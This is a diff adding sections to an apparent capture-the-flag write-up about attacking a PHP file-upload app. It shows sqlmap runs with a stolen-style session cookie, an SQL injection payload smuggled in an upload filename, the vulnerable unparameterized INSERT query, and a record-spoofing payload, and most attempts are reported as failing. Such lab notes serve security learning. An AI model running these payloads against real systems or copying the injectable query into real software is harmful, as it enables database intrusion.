@@ -75,3 +75,67 @@ Try:
     $('option').innerHTML = "payload ;)"
 
 Sleep works... So the command injection works. Perhaps we just can't make a connection back to the attacker.
+
+## SQLMap
+
+Log in as admin, and get your PHPSESSID cookie.
+
+    console.log(document.cookie)
+    PHPSESSID=qv2nlssejob21t9uq9jq67413c
+
+Then run:
+
+    PHPSESSID=whatever
+    sqlmap http://$VICTIM/files.php --cookie="PHPSESSID=$PHPSESSID" --forms --method=POST
+
+Yay, nothing happened ;_;
+
+Let's try `accounts.php`...
+
+    sqlmap http://$VICTIM/accounts.php --cookie="PHPSESSID=$PHPSESSID" --forms --method=POST
+
+Nothing either.
+
+## $fileName not parameterized
+
+If I upload to `/files.php`, and the name of the file is an SQL injection payload, I may be able to cause SQLi.
+
+Well, uploading `' or 1=1;--` causes an error.
+
+This is the raw request sent to the server (looks weird due to it being a file upload):
+
+    -----------------------------42444973397781975353726677533
+    Content-Disposition: form-data; name="userData"; filename="' or 1=1;--"
+    Content-Type: application/octet-stream
+
+    please upload me 😔
+    -----------------------------42444973397781975353726677533--
+
+
+Let's try to make a better payload.
+
+We control `$fileName` in this code:
+
+```php
+$sql = "INSERT INTO files(name, size, data, user) VALUES('{$fileName}', '{$fileSize}', '{$fileData}', '{$_SESSION['user']}')";
+```
+
+So we could spoof records with a payload thusly:
+
+    filename69', '69', 'good content', 'admin');--
+
+Doesn't work.
+
+## SQLMap again
+
+https://www.liquidmatrix.org/blog/sql-injection-using-sqlmap-multipartform-data-encoding/
+
+Apparently we're supposed to use a file containing POST data as a template.
+
+    sqlmap --cookie="PHPSESSID=$PHPSESSID" -r payloads/sqlmap-request.txt --method=POST -p "userData"
+
+Still not working.
+
+Time to cheat, hooray!
+
+## cheaty cheaty
